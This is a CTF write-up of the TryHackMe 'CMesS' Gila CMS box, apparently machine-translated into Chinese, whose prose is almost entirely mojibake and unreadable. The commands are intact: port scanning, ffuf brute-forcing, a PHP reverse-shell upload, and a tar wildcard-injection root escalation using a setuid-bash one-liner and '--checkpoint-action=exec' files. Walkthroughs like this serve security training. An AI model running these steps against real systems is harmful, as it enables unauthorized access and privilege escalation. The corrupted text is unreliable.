# CTF çš„å°è¯•

> åŸæ–‡ï¼š<https://infosecwriteups.com/tryhackme-cmess-ctf-c1339774550e?source=collection_archive---------1----------------------->

## ä½ èƒ½æ‰¾åˆ°è¿™ä¸ª Gila CMS ç›’å­å—ï¼Ÿ

![](img/c42ee35e92ea78ff62794ba1676bf314.png)

æ¥æº:tryhackme

**åœ¨è¿™é‡Œæ‰¾åˆ°çš„æˆ¿é—´**:ã€https://tryhackme.com/room/cmess 

åœ¨è¿™å°æœºå™¨ä¸­ï¼Œæˆ‘ä»¬åœ¨ **user.txt** å’Œ **root.txt** æ–‡ä»¶ä¸­å­˜å‚¨äº†ä¸¤ä¸ªæ ‡å¿—ã€‚

å¯åŠ¨æ‚¨çš„æœºå™¨â€¦â€¦

![](img/714f936500ebce20aa3210cbfb42123f.png)

æˆ‘ä»¬å°†è¿™å°æœºå™¨åˆ†æˆä¸¤ä¸ªä»»åŠ¡ï¼Œå³ [**ä»»åŠ¡ 1**](#eedb) & [**ä»»åŠ¡ 2**](#7471)

**#ã€ä»»åŠ¡ 1** ã€‘:è·å– **user.txt** æ–‡ä»¶ä¸­å­˜å‚¨çš„æ™®é€šç”¨æˆ·æ ‡å¿—

***æ­¥éª¤ 1-* >** åœ¨ **/etc/hosts** ä¸­æ·»åŠ æ‚¨çš„æœºå™¨ IP ä½œä¸º **cmess.thm** åç§°

![](img/89a4fa889f0704f078c90cd6ff2157cc.png)

***æ­¥éª¤ 2->***ping**cmess . thm**æ£€æŸ¥æœºå™¨æ˜¯å¦æ´»ç€

***æ­¥éª¤ 3 - >*** æ‰§è¡Œç«¯å£æ‰«æ

[](https://github.com/robertdavidgraham/masscan) [## GitHub-robertdavidgraham/mass can:TCP ç«¯å£æ‰«æå™¨ï¼Œå¼‚æ­¥æŠ›å‡º SYN åŒ…ï¼Œæ‰«æâ€¦

### è¿™æ˜¯ä¸€ä¸ªäº’è”ç½‘è§„æ¨¡çš„ç«¯å£æ‰«æå™¨ã€‚å®ƒå¯ä»¥åœ¨ 5 åˆ†é’Ÿå†…æ‰«ææ•´ä¸ªäº’è”ç½‘ï¼Œä¼ è¾“ 1000 ä¸‡â€¦

github.com](https://github.com/robertdavidgraham/masscan) ![](img/c4195685f3b817a93f222b1677a93e7c.png)![](img/568da4b24bfe89ec6a496a293feceed2.png)

æ‚¨å¯ä»¥æ‰‹åŠ¨è¿è¡Œå®ƒæˆ–ä½¿ç”¨æˆ‘çš„è„šæœ¬

```
#!/bin/bash

masscan -e tun0 $1 -p 1-65535 --rate 10000 > $1_masscan
cat $1_masscan | grep "Discovered open port" | awk {'print $4'} | tr -d /tcp >> $1_masscanP
cat $1_masscanP | while read b || [[ -n $b ]] ;do nmap -A -p"${b}" $1 ;done >> $1_nmap

# u also uncommnet below line
# rm $1_masscan
# rm $1_masscanP
# Usage : ./filaname.sh <ip>
```

æˆ‘ä»¬åœ¨ **cmess.thm** ä¸Šçš„ **/robots.txt** ç›®å½•ä¸­å‘ç°äº† 3 ä¸ªä¸å…è®¸çš„æ¡ç›®ï¼Œä½†æ˜¯åœ¨å¯¼èˆªä¹‹åï¼Œå®ƒåŒ…å«äº† 403 ç¦æ­¢æ¶ˆæ¯ã€‚

![](img/00765e3e0f2007d8ea63b0bdd34e5676.png)

ç½‘é¡µ

***æ­¥éª¤ 4 - >*** æ‰§è¡Œç›®å½•æ¨¡ç³ŠåŒ–

æˆ‘ä»¬ä½¿ç”¨ **ffuf** å·¥å…·è¿›è¡Œç›®å½•æ¨¡ç³ŠåŒ–ï¼Œè¿™æ˜¯æˆ‘æœ€å–œæ¬¢çš„æ¨¡ç³ŠåŒ–æˆ–æš´åŠ›ç ´è§£å·¥å…·ã€‚

[](https://github.com/ffuf/ffuf) [## GitHub - ffuf/ffuf:ç”¨ Go ç¼–å†™çš„å¿«é€Ÿç½‘é¡µæ¨¡ç³Šå™¨

### ä¸€ä¸ªç”¨ Go ç¼–å†™çš„å¿«é€Ÿ web fuzzerã€‚ffuf åœ¨ Porchetta Industries Discord æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªé¢‘é“ï¼Œæ­¤å¤–è¿˜æœ‰â€¦

github.com](https://github.com/ffuf/ffuf) 

å‘½ä»¤:***ffuf-w/root/Desktop/word lists/dir _ big . txt-u***[***http://cmess.thm/FUZZ***](http://cmess.thm/FUZZ)

![](img/ced3af6c0ed9572ecc458814ccae6bf7.png)

æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªå¾ˆé•¿çš„ç›®å½•åˆ—è¡¨ï¼Œä½†æˆ‘ä»¬è¯•å›¾åœ¨ä¸Šé¢å¯¼èˆªï¼Œä»–ä»¬è¦æ±‚è¾“å…¥ç”µå­é‚®ä»¶ id å’Œå¯†ç æ‰èƒ½ç™»å½•ã€‚

ä¹‹åï¼Œè¯•å›¾æ‰¾åˆ°ä¸€ä¸ªä¸ Gila cmess ç›¸å…³çš„æ¼æ´ï¼Œä½†æ²¡æœ‰å‘ç°ä»»ä½•æœ‰è¶£çš„ä¸œè¥¿ã€‚åœ¨ Hint çš„å¸®åŠ©ä¸‹è¯•å›¾æš´åŠ›ç ´è§£å­åŸŸã€‚

***æ­¥éª¤ 5 - >*** æ‰§è¡Œå­åŸŸè›®å¹²

å‘½ä»¤:***ffuf-w/root/Desktop/word lists/dir _ big . txt-u***[***http://cmess.thm/***](http://cmess.thm/)***-H " Host:fuzz . cmess . thm "-fw " 522 "***

![](img/abf690d5d5838b6d18128f4460c006a8.png)

ffuf

æˆ‘ä»¬åœ¨ **cmess.thm** ä¸Šå¾—åˆ°äº†ä¸€ä¸ª ***dev*** å­åŸŸï¼Œè¯•å›¾è®¿é—®å®ƒä»¬ï¼Œä½†åœ¨æ­¤ä¹‹å‰ï¼Œå°†è¿™ä¸ªå­åŸŸæ·»åŠ åˆ°æˆ‘ä»¬çš„ **/etc/hosts** æ–‡ä»¶ä¸­

![](img/d52acb528ce7afa0f7323bbe0d585569.png)

æµè§ˆ***dev . cmess . thm***æ‰¾åˆ°è¿™æ ·æœ‰è¶£çš„ä¸œè¥¿

![](img/a5e76b88df0015601b9916201bd2c511.png)

dev.cmess.thm

***æ­¥éª¤ 6 - >*** å°è¯•ä½¿ç”¨è¿™äº›å‡­è¯ç™»å½• cmess.thm/admin

![](img/edfe7499ffc2e82e88e14d7dc1e66883.png)

æˆ‘ä»¬æˆåŠŸç™»å½•åˆ°**å’Œ**ç®¡ç†é¢æ¿

***æ­¥éª¤ 7 - >*** ä¸Šä¼  php åå‘å¤–å£³

å°è¯•æ¢ç´¢ç®¡ç†é¢æ¿ä¸­çš„æ‰€æœ‰æ ‡ç­¾ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€äº›ä¸Šä¼ åŠŸèƒ½ã€‚å°è¯•ä¸Šä¼ åå‘å¤–å£³ï¼Œå› ä¸ºç½‘ç«™è¿è¡Œåœ¨ä¸€ä¸ª **Apache** æœåŠ¡å™¨ä¸Šï¼Œé‚£ä¹ˆ **PHP** å¯¹äºåå‘å¤–å£³éå¸¸æ–¹ä¾¿ã€‚

[](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) [## PHP-reverse-shell/PHP-reverse-shell . PHP at master

### æ­¤æ—¶æ‚¨ä¸èƒ½æ‰§è¡Œè¯¥æ“ä½œã€‚æ‚¨å·²ä½¿ç”¨å¦ä¸€ä¸ªæ ‡ç­¾é¡µæˆ–çª—å£ç™»å½•ã€‚æ‚¨å·²åœ¨å¦ä¸€ä¸ªé€‰é¡¹å¡ä¸­æ³¨é”€ï¼Œæˆ–è€…â€¦

github.com](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 

ç”¨æ‚¨çš„ ip æ›´æ”¹ IP å˜é‡å€¼å¹¶è®¾ç½®ç«¯å£å·

![](img/8d902e45b7a87c6b8efe985b8d549e77.png)

ä¸Šä¼ æ–‡ä»¶åè¢«å­˜å‚¨åœ¨**èµ„äº§**æ–‡ä»¶å¤¹ä¸­å¯¼èˆªåˆ°å®ƒ

![](img/a365d4ef1f89157a2d839272a6bba98a.png)

ç‚¹å‡»æˆ‘ä»¬çš„æ–‡ä»¶åï¼Œä¿å­˜è¿™ä¸ªæ–‡ä»¶ã€‚å¹¶åœ¨æˆ‘ä»¬çš„æœºå™¨ä¸Šå¯åŠ¨ netcat ç›‘å¬å™¨ã€‚ä½†æ˜¯ä»æˆ‘ä»¬æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶çš„åœ°æ–¹ã€‚

å¼€å§‹æ€è€ƒâ€¦â€¦

***ç¬¬ 8 æ­¥- >*** åœ¨æœºå™¨ä¸Šå¾—åˆ°ç¬¬ä¸€ä¸ªåå‘å£³

å½“æˆ‘ä»¬æ‰§è¡Œç›®å½•æ¨¡ç³ŠåŒ–æ—¶ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªåä¸º/assets çš„ç›®å½•ï¼Œè¯•ç€æµè§ˆå®ƒï¼Œä½†æ˜¯å®ƒä»¬æ˜¯ç©ºçš„ï¼Œè¯•ç€åœ¨æˆ‘ä»¬çš„æ–‡ä»¶ååé¢åŠ ä¸Šè¿™ä¸ªåå­—ï¼Œæ¯”å¦‚[http://cmess.thm/assets/](http://cmess.thm/assets/)æ–‡ä»¶å>ï¼Œç„¶åç‚¹å‡»å›è½¦

![](img/e60f06882f8f999fa43ece04e5f92a3d.png)

Booommmm â€¦

æˆ‘ä»¬å¾—åˆ°äº†æˆ‘ä»¬çš„ shellï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•è®¿é—®ä½äº **user.txt** æ–‡ä»¶çš„ **andre** æ–‡ä»¶å¤¹ï¼Œè¯¥æ–‡ä»¶æ˜¾ç¤ºæƒé™è¢«æ‹’ç»çš„æ¶ˆæ¯ã€‚

***ç¬¬ 9 æ­¥- >*** ä½¿ç”¨ **linpeas.sh** æŸ¥æ‰¾å‡çº§è·¯å¾„

è¿™æ˜¯ä¸€ä¸ªè‡ªåŠ¨æŸ¥æ‰¾ Linux ç³»ç»Ÿæ¼æ´çš„å·¥å…·

[](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) [## åœ¨å¡æ´›æ–¯æ³¢æ´›æ™®å¤§å¸ˆé‚£é‡Œ

### PEASS -æƒé™æå‡ç²¾å½©è„šæœ¬å¥—ä»¶(å¸¦é¢œè‰²)-PEASS-ng/Lin peas at master Carlos polop/PEASS-ng

github.com](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) 

åœ¨æˆ‘ä»¬çš„æœ¬åœ°æœºå™¨ä¸Šå¯åŠ¨ python æœåŠ¡å™¨

![](img/eb67c3d84c2f4c74f856ba5833dba55c.png)

ä¹‹ååœ¨ **wget** çš„å¸®åŠ©ä¸‹åœ¨ **/tmp** æ–‡ä»¶å¤¹ä¸­ä¸‹è½½ **linpeas.sh** ã€‚

![](img/d30891226bb7f4687f8b9da4b965afcc.png)

ç»™å®ƒæ‰§è¡Œæƒé™ **chmod +x linpeas.sh** è¿è¡Œå®ƒ**ã€‚/linpeas.sh**

æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªéšè—çš„ **bak** æ–‡ä»¶ï¼Œå­˜å‚¨åœ¨ **/opt** æ–‡ä»¶å¤¹å’Œ **cron job** ä¸­

![](img/7ecbfc1c0d7687bb090b3806d2487df5.png)

bak æ–‡ä»¶

![](img/02fd127e22edfa24ef107a007f500ee4.png)

cron ä½œä¸š

**ç¬¬ 10 æ­¥->-**ç¬¬ä¸€ä¸ªæ ‡å¿—

ä½¿ç”¨ **cat** æŸ¥çœ‹ **.password.bak** æ–‡ä»¶ä¸­çš„ä¿¡æ¯

![](img/f07190441c34184b562727e6cd6b57df.png)

è¿™çœ‹èµ·æ¥åƒå®‰å¾·çƒˆçš„å¤‡ä»½å¯†ç ï¼Œä½†æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨å®ƒï¼Ÿæˆ‘ä»¬çŸ¥é“ ssh åœ¨ 22 ç«¯å£ä¸Šæ˜¯å¼€æ”¾çš„ï¼Œå°è¯•ä½¿ç”¨è¿™ä¸ªå¯†ç ç™»å½•ã€‚

å‘½ä»¤:- ssh andre@cmess.thm

![](img/0bd4a0121854e1875a74895cb2fa21c5.png)![](img/46d1986b8c619af8b5ce94f8cc5d97a8.png)

æ——

æˆ‘ä»¬å¾—åˆ°äº†ç¬¬ä¸€é¢å›½æ——ã€‚ğŸ¤©

**#ã€ä»»åŠ¡ 2ã€‘:**è·å– **root.txt** æ–‡ä»¶ä¸­å­˜å‚¨çš„ **root** ç”¨æˆ·æ ‡å¿—

***æ­¥éª¤ 1 - >*** äº†è§£ **cron job**

ç°åœ¨æˆ‘ä»¬å¯ä»¥è®¿é—® andre çš„æ–‡ä»¶å¤¹äº†ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ä½¿ç”¨ **linpeas** æ‰¾åˆ°çš„ cron ä½œä¸šåšäº†ä»€ä¹ˆ

å‘½ä»¤:- **cat /etc/crontab**

![](img/ec8dd18f90bc513992d4f0dff7db0404.png)

åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæ¯ 2 åˆ†é’Ÿä½¿ç”¨ **tar** å°† **/home/andre/backup** æ–‡ä»¶å¤¹ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹å¤‡ä»½åˆ° **/tmp** æ–‡ä»¶å¤¹ä¸­ä½œä¸º **andre_backup.tar.gz** ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå³ ***(é€šé…ç¬¦)**ï¼Œè¿™æ„å‘³ç€ **/home/andre/backup** æ–‡ä»¶å¤¹ä¸­çš„ä»»ä½•å†…å®¹éƒ½æ˜¯å¤‡ä»½çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½æ¥æ»¥ç”¨è¿™å°æœºå™¨ã€‚

***æ­¥éª¤ 2 - >*** åˆ›å»º bash one liner

æˆ‘ä»¬ç®€å•åœ°åˆ›å»ºä¸€ä¸ª bash one liner æ¥è·å–æ ¹ shell

```
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > exploit.sh
```

å®ƒå¯ä»¥å°† **/bin/bash** å¤åˆ¶åˆ° **/tmp/bash** ä¸­ï¼Œå¹¶èµ‹äºˆå…¶æƒé™ä¸º **setuid** å’Œ **setgid**

å°†æ­¤æ–‡ä»¶ä¿å­˜åˆ° **/home/andre/backup** æ–‡ä»¶å¤¹ä¸­ã€‚æˆäºˆå®ƒæ‰§è¡Œæƒé™ã€‚å¹¶é”®å…¥å¦‚ä¸‹ä¸¤ä¸ªå‘½ä»¤ã€‚

**touch/home/Andre/backup/â€”check point = 1**(**â€”check point = 1**æ˜¯ **tar** ç”¨äºæ˜¾ç¤º 1 æ¡è®°å½•åçš„è¿›åº¦ä¿¡æ¯)

**touch/home/Andre/backup/â€”check point-action = exec = sh \ exploit . sh(**å®ƒç”¨äºåœ¨æ¯ä¸ªæ£€æŸ¥ç‚¹è¿è¡ŒæŒ‡å®šçš„æ“ä½œåï¼Œå³è¿è¡Œ **exploit.sh)**

ç­‰å¾… 2 åˆ†é’Ÿâ€¦..

é”®å…¥å‘½ä»¤: **/tmp/bash -p** (ç”¨äºæ‰§è¡Œ **/tmp/bash** æ–‡ä»¶å¤¹)

æˆ‘ä»¬å¾—åˆ°äº†æˆ‘ä»¬çš„æ ¹å£³â€¦â€¦ &æ——å¸œâ€¦â€¦..

![](img/fbae8451317a7b083597bb6e4146c480.png)

æ ¹æ ‡å¿—

**:æ³¨:**
å¦‚æœä½ è¢«å›°åœ¨æŸä¸ªåœ°æ–¹ï¼Œæ‰¾ä¸åˆ°ç©¿é€æœºå™¨çš„æ–¹æ³•ï¼Œåƒä¸‡ä¸è¦ä»¥ä¸ºè‡ªå·±ä¼šä»€ä¹ˆéƒ½ä¸åšï¼Œæˆ–è€…å¼€å§‹æ€€ç–‘è‡ªå·±ã€‚çœ‹**æç¤º**ã€‚è¿™æ˜¯ä½ å­¦ä¹ æ–°ä¸œè¥¿çš„æ–¹æ³•ã€‚ä½†åœ¨æ­¤ä¹‹å‰ï¼Œå°è¯•ä½ æ­¦å™¨åº“ä¸­æ‰€æœ‰çš„æ­¦å™¨ã€‚

ä¸æ–­å­¦ä¹ â€¦â€¦

æ„Ÿè°¢é˜…è¯»ğŸ’“â€¦â€¦â€¦â€¦

å¸®æˆ‘æ¥é€š:

[Twitter](https://twitter.com/bhavesharmalkar) ï¼Œ [Linkedin](https://www.linkedin.com/in/bhaveshharmalkar/) ï¼Œ [GitHub](https://github.com/bhaveshharmalkar)

## æ¥è‡ª Infosec çš„æŠ¥é“:Infosec æ¯å¤©éƒ½æœ‰å¾ˆå¤šå†…å®¹ï¼Œå¾ˆéš¾è·Ÿä¸Šã€‚[åŠ å…¥æˆ‘ä»¬çš„æ¯å‘¨ç®€è®¯](https://weekly.infosecwriteups.com/)ä»¥ 5 ç¯‡æ–‡ç« ã€4 ä¸ªçº¿ç¨‹ã€3 ä¸ªè§†é¢‘ã€2 ä¸ª GitHub Repos å’Œå·¥å…·ä»¥åŠ 1 ä¸ªå·¥ä½œæé†’çš„å½¢å¼å…è´¹è·å–æ‰€æœ‰æœ€æ–°çš„ Infosec è¶‹åŠ¿ï¼